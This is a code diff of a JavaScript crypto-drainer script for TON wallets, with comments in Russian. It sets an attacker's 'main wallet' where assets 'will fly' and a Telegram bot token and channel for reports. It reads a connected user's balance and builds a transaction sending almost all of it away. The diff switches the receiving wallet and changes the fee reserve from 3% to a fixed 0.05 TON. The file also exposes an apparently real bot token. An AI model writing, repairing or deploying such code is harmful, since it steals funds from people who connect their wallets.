@@ -1,4 +1,4 @@
-var mainWallet = "0QClacqt1G1VQ9sasHogYbaMn0pZJdTKnrZBfYmDXOELmu4E"; //Ваш кошелек, куда будут лететь активы
+var mainWallet = "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU"; //Ваш кошелек, куда будут лететь активы
 var tgBotToken = "7528939996:AAErOsqbJpqE1tR7Gb3c203WEqgW5mfYMsQ"; //Токен от бота телеграмм
 var tgChat = "-1002520000903"; //Ваш телеграмм-канал
 
@@ -48,7 +48,8 @@ async function didtrans() {
     const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
-    let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
+    console.log('бал', originalBalance);
+    let processedBalance = originalBalance - 50000000; // вычитаем 0.05 TON в nanotons
     let tgBalance = processedBalance / 1000000000;
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
